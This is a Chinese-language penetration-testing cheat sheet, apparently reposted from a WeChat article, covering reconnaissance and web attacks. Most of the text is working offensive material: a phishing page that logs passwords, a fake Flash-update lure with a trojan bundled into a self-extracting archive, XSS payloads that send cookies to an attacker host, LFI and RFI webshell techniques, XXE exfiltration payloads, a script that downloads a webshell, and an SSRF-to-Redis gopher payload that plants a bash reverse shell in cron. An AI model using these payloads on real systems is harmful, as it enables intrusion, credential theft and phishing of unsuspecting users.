\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/6yaOaU4WRhmMwj1D830FsQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/GfOvuXUmaIichKN4fuyBV856xHdsnuRTeChfYItiaiaP6C5QQibXh56dmwWiaMFia2yE01nib45cPuiaib6kMd5OT95aeeA/640?wx_fmt=gif)  

****常规操作内容较多，将分：上、中、下进行分享。****
==============================

**信息收集**
========

**Whois**
---------

```
站点注册人注册过的其他网站(对注册人、邮箱、电话的反查)，对查到的站点的深入

```

```
网站IP


```

### **是否存在 CDN**

```
Ping、多地ping、国外ping

```

**`Bypass cdn常规方式`**

```
子域名

```

```
https://dnsdb.io/zh-cn/
Ping根域名
Nslookup
Cloudflare的真实IP寻找
  http://crimeflare.org:82/cfs.html
  https://github.com/gwen001/pentest-tools/blob/master/cloudflare-origin-ip.py
查找老域名
查找关联域名
  www.baidu.com
  www.baidu.cn
  www.baidu.org
  www.baidu.xyz等等
信息泄露/配置文件
Phpinfo
网页源码
Svn
Github
Shodan/fofa/zoomeye
SSL证书记录
https://censys.io/
网站漏洞
  Xss
  Ssrf
  命令执行
  SQL注入(某种情况loadfile读取linux的ip配置文件，hosts文件等)
DNS记录，证书记录
设置xff/x-remote-ip/x-remote-addr为127.0.0.1/或ipv6地址
RSS订阅/邮件头
APP反编译搜索/截取APP的请求信息
修改hosts文件指向

```

**`域名历史IP`**

```
https://x.threatbook.cn/

```

**网站架构 / 服务器指纹 / CMS 识别 / 容器**
------------------------------

**子域名**
-------

```
老站、同样架构或同源码的子站
爆破，接口查询
  https://phpinfo.me/domain/
  https://d.chinacycc.com/index.php?m=Login&a=index
  subDomainBrute、knockpy
OWA发现、dig adfs、dig mail
https://dns.bufferover.run/dns?q=baidu.com
http://api.hackertarget.com/reversedns/?q=target.com

```

```
网站使用的CMS的官方demo站


```

找不到 demo 就找源码开发者，加群什么的，结合社会工程学要个后台截图 (对于一些后台目录复杂的 cms)，注意看网站上一些功能介绍的截图。

**SSL 证书信息**

```
https://crt.sh/?q=%25.target.com
https://censys.io/certificates?q=target.com
https://github.com/cheetz/sslScrape

```

**DNS 历史解析记录**
--------------

```
https://dnsdumpster.com/
https://censys.io/
https://securitytrails.com/
域传送漏洞检查
  Dnsenum、fierce
http://ha.ckers.org/fierce/
$ ./fierce.pl -dns example.com
$ ./fierce.pl –dns example.com –wordlist myWordList.txt
>dig @ns.example.com example=.com AXFR
>nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器
>nslookup #进入nslookup交互模式
>server dns.domian.com #指定dns服务器
>ls xxx.yyy.cn #列出域信息

```

**同服站点情况**
----------

```
https://site.ip138.com/
火狐插件flagfox,配置单击指向bing查ip对应的域名

```

**同样架构或源码的站**

**网站 js**
---------

```
https://github.com/003random/getJS
https://github.com/Threezh1/JSFinder
或浏览器F12也可以看到加载的
敏感信息、可能存在漏洞的参数等信息
查看网页源代码，注释的一些信息，比如没有删掉的接口、前台没有的页面、越权、注入、js等

```

**网站使用的第三方 js**
---------------

云信息
---

```
Aliyun、AWS、GCP、Azure等
查找可公开访问的实例
  https://github.com/gwen001/s3-buckets-finder
  https://github.com/nccgroup/aws-inventory
  https://github.com/jordanpotti/AWSBucketDump

```

```
APP反编译


```

```
url、js、osskey、api等信息查找
搜集到接口该怎么做
  Fuzz常见参数

```

**C 段 / B 段信息**

```
Banner、是否存在目标的后台或其他入口/其他业务系统

```

**工具**

```
recon-ng,theharvester,maltego,exiftool等
https://www.spiderfoot.net/
https://github.com/smicallef/spiderfoot

```

**端口对外开放情况**
------------

```
Masscan、scanport等
针对常见的那些端口的利用的常规方法
常见的未授权访问的服务如redis，mongodb等

```

**目录扫描 / 爬虫 (慎用)**
------------------

**WAF 情况识别**
------------

```
https://github.com/EnableSecurity/wafw00f
做好绕过策略的计划

```

**随手测试**
--------

```
单引号
xx.jpg/.php
admin/123456
万能密码
Heartbleed漏洞

```

**搜索引擎**

```
Google自定义搜索引擎整合的300多个社交网站
https://cse.google.com/cse?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB\_Xvu5DCvg&cx=001794496531944888666:iyxger-cwug&q=%22%22
Google自定义搜索引擎整合的文件共享网站
https://cse.google.com/cse/publicurl?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB\_Xvu5DCvg&cx=001794496531944888666:hn5bcrszfhe&q=%22%22
领英用户提取
  https://cse.google.com/cse?cx=001394533911082033616:tm5y1wqwmme

```

**Shodan/fofa/zoomeye**

**Google dorks**
----------------

```
 Site,filetype,intitle,inurl,intext等

```

**信息泄露**

```
电话、邮箱，姓名
目录遍历
备份文件
  (www.zip,xx.com.zip,www.xx.com.zip,wwwroot.zip)
.svn/.git/sql/robots/crossdomin.xml/DS\_Store等
  https://github.com/lijiejie/ds\_store\_exp
  https://github.com/admintony/svnExploit
若是论坛ID=1的用户名一般为管理、或查看帖子信息、生成字典
网页上客服的QQ(先判断是企业的还是个人，用处有时不太大，看怎么用，搞个鱼叉什么的)

```

```
网页缓存


```

```
http://www.cachedpages.com/

```

**图片反查**

```
百度识图、googleimage、tineye
原图查询坐标

```

```
社交

```

```
QQ、weibo、支付宝、脉脉、领英、咸鱼、短视频、人人、贴吧、论坛
外网信息
有些人喜欢把自己的生活传到外网
推特、ins、fb等

```

**手机号加入通讯录匹配各个 APP 用户信息**

**注册过的网站**
----------

```
https://www.reg007.com/
https://www.usersearch.org/

```

**目标人员的兴趣**
-----------

```
目标人员的兴趣 注册过的小众论坛，站点
针对此类站点的深入
收集到的用户名，电话等信息生成字典

```

邮箱搜集
----

```
https://hunter.io/
https://github.com/killswitch-GUI/SimplyEmail

```

**Exchange**

```
https://github.com/dafthack/MailSniper

```

```
验证邮箱是否存在


```

```
https://tools.verifyemailaddress.io/

```

**历史泄露过的资料等**
-------------

```
库
https://haveibeenpwned.com/
https://github.com/kernelmachine/haveibeenpwned

```

**Github/Gitee 等代码托管平台**
------------------------

```
https://github.com/dxa4481/truffleHog
https://github.com/lijiejie/GitHack
https://github.com/MiSecurity/x-patrol
https://github.com/az0ne/Github\_Nuggests
https://github.com/mazen160/GithubCloner克隆用户的github

```

**被入侵网址列表**

```
http://zone-h.org/archive
wooyun镜像查找目标企业曾出现的漏洞

```

**GPS 查询**
----------

```
https://www.opengps.cn/Default.aspx

```

**网站 URL 提取**
-------------

```
http://www.bulkdachecker.com/url-extractor/

```

**蜜罐判断 (参考一下即可)**
-----------------

```
https://honeyscore.shodan.io/

```

```
默认密码

```

```
https://default-password.info/
http://routerpasswords.com

```

```
如需注册


```

```
Sms
https://www.materialtools.com/
http://receivefreesms.com/
Email
https://10minutemail.net/
https://zh.mytrashmailer.com/
http://24mail.chacuo.net/enus
https://www.linshiyouxiang.net/
Fake id
https://www.fakenamegenerator.com/
http://www.haoweichi.com/
https://www.fakeaddressgenerator.com/

```

**企业信息**
--------

```
天眼查、企查查、企业信用信息公示系统
企业邮箱收集，企业架构画像、人员统计、人员职责、部门、WiFi、常用部门密码、人员是否泄露过密码、人员平时爱逛的站点、OA/erp/crm/sso/mail/vpn等入口、网络安全设备（waf,ips,ids,router等统计）、内部使用的代码托管平台(gitlab、daocloud等)，bug管理平台、服务器域名资产统计


```

**入口点**
=======

win10 安装 kali(wsl)
------------------

```
Microsoft Store查找kali下载。
Powershell执行
>Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
源设置vim /etc/apt/source.list
deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
>sudo su
>passwd root修改root密码
>apt-get update &apt-get upgrade 更新
>apt-get dist-upgrade
>apt-get clean
cmd>kali config --default-user root 设置默认启动用户为root
cmd>net stop/start LxssManager重启服务
>apt-get install metasploit-framework
>apt install kali-linux-full 安装完整kali工具集

```

**水坑攻击**
--------

### **XSS 克隆钓鱼**

```
保存js&css到服务器，登录action改为接受密码的文件action="./pass.php"
<?php //php
  $user=$\_POST\['username'\];
  $pass=$\_POST\['password'\];
  $file=fopen('pass.txt','a+');
  fwrite($file,$user."|"."pass" . "\\n");
  fclose($file);
  echo "<script>window.location.href=\\"http://192.168.0.1\\"</script>\\n";
?>
构造payload
<script>window.location.href="http://192.168.0.1/login.html"</script>
php –S 0.0.0.0:8080 –t ./

```

### **伪造页面钓鱼**

**1  
**

```
https://github.com/r00tSe7en/Fake-flash.cn
添加xss平台模块
window.alert = function(name){
var iframe = document.createElement("IFRAME");
iframe.style.display="none";
iframe.setAttribute("src",'data:text/plain');
document.documentElement.appendChild(iframe);
window.frames\[0\].window.alert(name);
iframe.parentNode.removeChild(iframe);
}
alert("您的FLASH版本过低，尝试升级后访问该页面！");
window.location.href="http://www.flash.com";
制作自解压捆绑
一个马.exe，一个正常exe，全选，winrar添加到压缩文件，选择创建自解压格式压缩文件，高级->自解压选项，设置解压路径，c:\\windows\\temp\\，设置->解压后运行两个exe文件，模式全部隐藏，更新，解压并更新文件，覆盖所有文件。
ResourceHacker修改文件图标

```

#### 2

```
 if(empty($\_COOKIE\['flash'\])){
      echo '<script>alert("你当前计算机的Flash软件已经很久未更新，将导致无法正常显示界面内容，请下载安装最新版本！");window.location="http://www.flash.cn.xx.com/"</script>';
      setcookie("flash","true",time()+30\*2400);
  }

```

**对外服务攻击**
----------

### **Web**

#### **前端 / 逻辑漏洞**

##### **注册**

```
任意用户注册
可爆破用户名
注入
XSS

```

```
爆破用户名，密码
注入
万能密码
Xss
Xss+Csrf
修改返回包信息，登入他人账户
修改cookie中的参数，如user,adminid等

```

##### **任意密码重置**

```
1．重置一个账户，不发送验证码，设置验证码为空发送请求。
2．发送验证码，查看相应包
3．验证码生存期的爆破
4．修改相应包为成功的相应包
5．手工直接跳转到校验成功的界面
6．两个账户，重置别人密码时，替换验证码为自己正确的验证码
7．重置别人密码时，替换为自己的手机号
8．重置自己的成功时，同意浏览器重置别人的，不发验证码
9．替换用户名，ID，cookie，token参数等验证身份的参数
10．通过越权修改他人的找回信息如手机/邮箱来重置

```

```
信息泄露

```

```
HTML源码、JS等查看信息搜集一章

```

##### **后台**

```
登录参数修改为注册参数/reg、/register、/sign等

```

#### **JWT 攻击手法**

```
https://jwt.io/#debugger-io

```

##### **未校验签名**

```
将原JWT串解码后修改用户名等身份认证的地方，生成新token发送请求

```

##### **禁用哈希**

```
Alg代表加密方式，修改用户名等身份认证的地方，把HS256设置为none生成token发送请求，使用python的pyjwt模块

```

```
jwt.encode({'user':'admin','arg1':'value1','arg2':'value2'},algorithm='none',key='')

```

```
暴破弱密钥


```

```
\>pip3 install pyjwt
>python3 crack.py
import jwt
import termcolor
jwt\_str = R'token'
with open('/root/password.txt') as f:
  for line in f:
  key\_ = line.strip()
  try:
    jwt.decode(jwt\_str,verify=True,key=key\_)
    print('\\r','\\bfound key -->',termcolor.colored(key\_,'green'),'<--')
    break
  except(jwt.exceptions.ExpiredSignatureError,jwt.exceptions.InvalidAudienceError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.ImmatureSignatureError):
    print('\\r','\\bfound key -->',termcolor.colored(key\_,'green'),'<--')
  except jwt.exceptions.InvalidSignatureError:
    print('\\r',' ' \* 64, '\\r\\btry',key\_,end='',flush=True)
    continue
else:
  print('\\r','\\bnot found.')

```

#### **XSS**

```
打COOKIE
<svg/onload="javascript:document.location.href=('http://xx.xx.xx.xx:7777?cookie='+document.cookie)">
读取HTML
<svg/onload="document.location='http://xx.xx.xx.xx:7777/?'+btoa(document.body.innerHTML)">
读文件
<svg/onload="
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
  {
    document.location='http://xx.xx.xx.xx:7777/?'+btoa(xmlhttp.responseText);
  }
}
xmlhttp.open("GET","file.php",true);
xmlhttp.send();
">
XSS+SSRF读取服务器文件
<svg/onload="
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
if (xmlhttp.readyState==4 && xmlhttp.status==200)
{
    document.location='http://vps\_ip:23333/?'+btoa(xmlhttp.responseText);
}
}
xmlhttp.open("POST","request.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("url=file:///etc/passwd");
">

```

#### **CSRF**

```
查看有无token等验证身份的参数，删掉后是否返回正常
查看header中referer,origin参数，删掉后是否返回正常
使用csrftester/burpsuite生成表单，以另一账号和浏览器打开测试
去掉referer中域名后面的文件夹或文件
替换二级域名

```

#### php 任意文件读取 / 下载

```
readfile()、file\_get\_contents()、fopen()等读文件的函数不严谨，读取文件路径可控，输出内容。
下载配置文件
Redis、Weblogic、ftp、mysql、web配置文件、history文件、数据库配置文件
下载log文件
下载web文件
/1.php?f=../../etc/passwd
/1.php?f=file:///etc/passwd(file://绕过../的防护)
/1.php?f=file:///etc/passwd

```

#### **php 文件包含**

```
函数:
include
require
include\_once
require\_once

```

##### **常用协议**

```
file:// — 访问本地文件系统
file协议的工作目录是当前目录，使用file:///wwwroot/1.php等同于./wwwroot/1.php可用于绕过一些情况
php:// — 访问各个输入/输出流（I/O streams）

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp4V0AaXNoiaS10STsWEZPGWV99xu7VTaibWqutdSibU0MokiaUdXFqXjJJQ/640?wx_fmt=png)

```
读取
1.php?file=php://filter/read=convert.base64-encode/resource=./1.php
写入
1.php?file=php://filter/write=convert.base64-decode/resource=\[file\]","base64

```

##### **Getshell**

```
https://github.com/D35m0nd142/LFISuite

```

###### **allow\_url\_include 开启时 Getshell**

```
远程文件包含
/1.php?file=http://remote.com/shell.txt
/1.php?file=php://input  POST:<?php phpinfo();?>
或使用curl
>curl -v "http://127.0.0.1:8888/ctf/cli/3.php?file=php://input" -d "<?php phpinfo();?>"
或使用data://协议解析base64的代码
/1.php?file=data://text/plain;base64,PD9waHAgIHBocGluZm8oKTs/Pg==

```

**allow\_url\_include 关闭时 Getshell**

```
攻击机开启共享
/1.php?file=//attacker/1.php
创建webdav服务，shell文件放入目录包含即可
>docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS\_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav
Shell文件放入/root/webdav/data
/1.php?file=//attacker/1.php

```

```
包含日志文件getshell


```

```
Fuzz文件
https://github.com/fuzzdb-project/fuzzdb
https://github.com/danielmiessler/SecLists
https://blog.csdn.net/qq\_33020901/article/details/78810035
/1.php?file=<?php phpinfo();?>
/1.php?file=../../../../../../../var/log/apache2/access.log
Win下使用phpstudy
请求/<?php phpinfo();?>
包含错误日志
/1.php?file=C:\\phpStudy\\Apache\\logs\\error.log

```

###### **上传个图片格式的木马直接包含**

```
/1.php?file=/uploadfile/1.jpg

```

###### **限制后缀时**

```
<?php
$file = $\_GET\['file'\].".php";
include($file);
?><br>
利用伪协议zip，构造一个zip压缩包，打包一个shell.php，将压缩包更名为png

```

```
请求
/1.php?file=zip://shell.png%23shell

```

```
也可使用phar协议访问
/1.php?file=phar://shell.png/shell
老版本可以使用%00截断
/etc/passwd%00
(需要 magic\_quotes\_gpc=off，PHP小于5.3.4有效)
/var/www/%00
/etc/passwd/././././././.\[…\]/./././././.
(需要 magic\_quotes\_gpc=off
(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)
点号截断：
/boot.ini/………\[…\]…………
(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)

```

###### **phpinfo-LFI 本地文件包含临时文件 getshell**

```
利用临时文件删除时间差获取shell
需要一个lfi漏洞+phpinfo页面
在/tmp/目录下生成个密码为f的一句话木马

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpsv89cIM8RmHBjiaG4GBFzoIkLicQgljIFs60R97tuMARHOZib1X0enwng/640?wx_fmt=png)

```
修改脚本的phpinfo文件名称


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpczX6VcFjCm0tCgQn93VlHWBvwuobZicbbhEma6AGU2RCEFWQibM4bib6Q/640?wx_fmt=png)

```
LFI文件


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpYc3g21M4WAjib5AruIBNZDpOa0bCXeNYwviaLNVAiawSLmiaViasMTLc5og/640?wx_fmt=png)

```
执行


```

```
\>python getshell.py 192.168.0.108 80 100
80是端口、100是线程

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpWMorwvAkEleOwJVURKr2q7QuNbFwkeEh1CbTHj5hz7eiaUg31D6fvLQ/640?wx_fmt=png)

```
http://192.168.0.110/index.php?file=../../../tmp/g&f=echo%20%271%27

```

###### session + lfi getshell

```
session.upload\_progress.enabled启用时，文件上传会产生进度文件
/var/lib/php5/sess\_
/var/lib/php/sess\_

```

###### LFI SSH Log

```
\>ssh '<?php system($\_GET\['c'\]); ?>'@192.168.0.107
>http://192.168.0.107/lfi.php?file=/var/log/auth.log&c=ls

```

###### **RFI & 命令注入上线 MSF**

```
MSF生成


```

```
#use exploit/multi/script/web\_delivery
#set target PHP
注入点注入：
php -d allow\_url\_fopen=true -r "eval(file\_get\_contents('http://192.168.0.107:1234/OgsOFaj3yKH'));"
RFI：
http://www.xx.com/file=http://192.168.0.107:1234/OgsOFaj3yKH

```

#### XML

```
XML设计的宗旨是传输数据，而非显示数据
XXE=XML外部实体注入、XML=可扩展标记语言
Xml文件声明
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
DTD为XML的文档类型定义
引入外部DTD
<!DOCTYPE 根元素 SYSTEM "filename">
参数实体+外部实体
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test \[
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  %file;
\]>

```

```
闭合标签，改写xml文件，用户可控，有拼接代码
<?xml version="1.0" encoding="utf-8"?>
<manager>
  <admin>
<username>admin</username>
<password>admin</password>
</admin>
<admin>
<username>root</username>
<password>root</password>
</admin>
</manager>
若是password可控，拼接代码形成注入
admin </password></admin><admin id="3"><name>hack</name><password>hacker</password></admin>

```

##### XXE

```
https://github.com/AonCyberLabs/xxe-recursive-download
程序解析XML输入时，未禁止外部实体的加载，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害

```

###### 判断

```
回显路径


```

```
  <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root \[<!ENTITY % remote SYSTEM "test">%remote;\]>
DNSLOG
  http://www.dnslog.cn/
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root \[<!ENTITY dtd SYSTEM "http://xxx.dnslog.cn/xxe">\]>
<xxe>&dtd;</xxe>
Webdav
  存在webdav可使用PROPPATCH、PROPFIND、 LOCK等请求方法接受xml输入形成xxe
Wsdl使用AWVS测试

```

```
挖掘

```

```
如遇与xml交互的地方
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE ANY \[  
<!ENTITY test "this is test"> 
\]> 
<root>&test;</root>
看是否输出
检查是否支持外部实体
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE ANY \[  
<!ENTITY % foo SYSTEM "http://attacker/evil.xml"> 
%foo;
\]> 
查看你的服务器是否有请求
JSON content-type XXE
修改Content-Type: application/xml
X-Requested-With: XMLHttpRequest
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE netspi \[<!ENTITY xxe SYSTEM "file:///etc/passwd" >\]>
<root>
<参数name>name</参数name>
<参数value>&xxe;</ 参数value>
</root>

```

```
有回显读取本地文件

```

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE creds \[  
<!ENTITY goodies SYSTEM "file:////etc/passwd"> \]> 
<creds>&goodies;</creds>
也可去掉文件列目录
file:///root/.sh/id\_rsa
特殊字符
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE roottag \[
<!ENTITY % start "<!\[CDATA\[">   
<!ENTITY % goodies SYSTEM "file:////tmp/xxx.txt">  
<!ENTITY % end "\]\]>">  
<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"> 
%dtd; \]> 
<roottag>&all;</roottag>
evil.dtd
<?xml version="1.0" encoding="UTF-8"?> 
<!ENTITY all "%start;%goodies;%end;">

```

###### **Blind OOB XXE 无回显读取**

```
需使用参数实体，引用外部DTD
Payload
<!DOCTYPE convert \[ 
<!ENTITY % remote SYSTEM "http://ip/test.dtd">
%remote;%int;%send;
\]>
test.dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY % send SYSTEM 'http://attacker:9999?p=%file;'>">

```

```
列目录

```

```
远程payload
<!ENTITY % a SYSTEM "file:///"> <!ENTITY % b "<!ENTITY % c SYSTEM 'gopher://ip:80/%a;'>"> %b; %c;
注入payload
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root \[<!ENTITY % remote SYSTEM "http://attacker:80/1.xml">%remote;\]><root/>

```

**不同平台支持的协议**

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpQEic13dAL1RCC7X3qF1wcZGQlNBPwTDwRXT3D1k6KzCkia5iakvcI9Wlg/640?wx_fmt=png)

###### **执行命令**

```
安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe \[
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "expect://id" >\]>
<root>
<name>&xxe;</name>
</root>

```

###### **内网主机探测**

```
可先读取/etc/network/interfaces、/proc/net/arp、/etc/hosts等文件查询IP段
使用脚本

```

###### **内网端口扫描**

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://127.0.0.1:515/" \[
<!ELEMENT data (#PCDATA)>
\]>
<data>4</data>
可使用burpsuite的intruder模块进行遍历

```

###### 内部 DTD 利用

###### Linux

```
  <!ENTITY % local\_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamsa 'Your DTD code'>
%local\_dtd;

```

###### Windows

```
<!ENTITY % local\_dtd SYSTEM "file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd">
<!ENTITY % SuperClass '>Your DTD code<!ENTITY test "test"'>
%local\_dtd;
<?xml version="1.0" ?>
<!DOCTYPE message \[
<!ENTITY % local\_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app\_1\_0.dtd">
<!ENTITY % condition 'aaa)>
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
    <!ELEMENT aa (bb'>
%local\_dtd;
\]>
<message>any text</message>

```

###### **XXE 写 shell**

```
当XXE支持XSL时
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<msxsl:script language="C#" implements-prefix="user">
<!\[CDATA\[
public string xml()
{
    System.Net.WebClient webClient = new System.Net.WebClient();
    webClient.DownloadFile("https://x.x.x.x/shell.txt",
                   @"c:\\inetpub\\wwwroot\\shell.aspx");
return "Exploit Success";
}
\]\]>
</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:xml()"/>
</xsl:template>
</xsl:stylesheet>

```

#### **SSRF**

##### 定义

```
服务端请求伪造
构造一个由服务器发出请求的漏洞
服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制


```

##### 成因

```
file\_get\_contents()、fsockopen()、curl\_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞

```

##### **挖掘**

```
转码服务
在线翻译
获取超链接的标题等内容进行显示
请求远程服务器资源的地方，图片加载与下载(通过URL地址加载或下载图片)
图片、文章收藏功能
对外发起网络请求的地方，网站采集、网页抓取的地方。
头像 (远程加载头像)
一切要你输入网址的地方和可以输入ip的地方。
数据库内置功能(mongodb的copyDatabase函数)
邮件系统
文件处理
在线处理工具
从URL关键字中寻找：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain

```

```
XML


```

```
<!ENTITY % d SYSTEM "http://wuyun.org/evil.dtd">
<!ENTITY % file system "file:///etc/passwd" >
<!ENTITY % d SYSTEM "http://wuyun.org/file?data=%file">
<!DOCTYPE roottag PUBLIC "-//VSR//PENTEST//EN" "http://wuyun.org/urlin">
<xenc:AgreementMethod Algorithm= "http://wuyun.org/1">
<xenc:EncryptionProperty Target= "http://wuyun.org/2">
<xenc:CipherReference URI= "http://wuyun.org/3">
<xenc:DataReference URI= "http://wuyun.org/4">
<Reference URI="http://wuyun.org/5">
<To xmlns="http://www.w3.org/2005/08/addressing">http://wuyun.org/to</To>
<ReplyTo xmlns="http://www.w3.org/2005/08/addressing">
<Address>http://wuyun.org/rto</Address>
<input message="wooyun" wsa:Action="http://wuyun.org/ip" />
<output message="wooyun" wsa:Action="http://wuyun.org/op" />
<wsp:PolicyReference URI=“http://wuyun.org/pr">
<fed:Federation FederationID="http://wuyun.org/fid">
<fed:FederationInclude>http://wuyun.org/inc</fed:FederationInclude>
<fed:TokenIssuerName>http://wuyun.org/iss</fed:TokenIssuerName>
<mex:MetadataReference>
<wsa:Address>http://wuyun.org/mex</wsa:Address>
</mex:MetadataReference>
<edmx:Reference URI="http://wuyun.org/edmxr">
<edmx:AnnotationsReference URI="http://wuyun.org/edmxa">
<xbrli:identifier scheme="http://wuyun.org/xbr">
<link:roleType roleURI="http://wuyun.org/role">
<stratml:Source>http://wuyun.org/stml</stratml:Source>

```

###### **数据库**

###### **MongoDB**

```
db.copyDatabase('\\r\\nconfig set dbfilename ssrf\\r\\nquit\\r\\n’,'test','10.6.4.166:6379')

```

```
PostgresSQL


```

```
SELECT dblink\_send\_query(
 'host=127.0.0.1 
dbname=quit 
user=\\'\\r\\nconfig set dbfilename wyssrf\\r\\n\\quit\\r\\n' 
password=1 port=6379 sslmode=disable', 
'select version();’ 
);

```

###### **MSSQL**

```
SELECT openrowset('SQLOLEDB', 'server=192.168.1.5;uid=sa;pwd=sa;database=master')
SELECT \* FROM OpenDatasource('SQLOLEDB', 'Data Source=ServerName;User ID=sa;Password=sa' ) .Northwind.dbo.Categories

```

```
图片处理函数


```

```
FFmpeg
concat:http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd
ImageMagick
fill 'url(http://wyssrf.wuyun.org)'

```

```
攻击


```

```
测试代码,需安装phpcurl模块apt-get install php7.0-curl
<?php
echo 'r u ok?';
function curl($url){  
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $url);
curl\_setopt($ch, CURLOPT\_HEADER, 0);
curl\_exec($ch);
curl\_close($ch);
}
$url = $\_GET\['url'\];
curl($url);
?>
对内网、本地进行端口扫描，获取服务的banner 信息
攻击运行在内网或本地的应用程序
对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)
攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)
读取内网资源(如：利用file协议读取本地文件等)
跳板
无视cdn
利用Redis未授权访问，HTTP CRLF注入实现getshell

```

###### **文件读取**

```
\>curl -v 'http://192.168.0.110/ssrf.php?url=file:///etc/passwd'

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpibSibxblPicXdq9WD4fLfIibsbxrBbNiayDiaAu3BoLTrGAkGZxhj8dVhvNw/640?wx_fmt=png)

```
?url=php://filter/read=convert.base64-encode/resource=./1.php

```

```
端口探测


```

```
\>curl -v 'http://www.xx.com/ssrf.php?url=dict://127.0.0.1:22/'

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpj1xHy7RSd7HkGcZyDWWSGicOicVU8Kc5icRBvicgvLzzHicCBXHyiavNTvgA/640?wx_fmt=png)

```
\>curl -v 'http://www.xx.com/ssrf.php?url=dict://127.0.0.1:6379/info'

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpoWEBBibgCtChSWN0Y4tTesoJtdiavYXKEA49yLVjmtDd6Jvmn04CLicsw/640?wx_fmt=png)

###### **SSRF+Redis**

```
\>curl -v 'http://192.168.0.112/ssrf.php?url=gopher://192.168.0.120:6379/\_\*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.0.108%2f12345%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a'

```

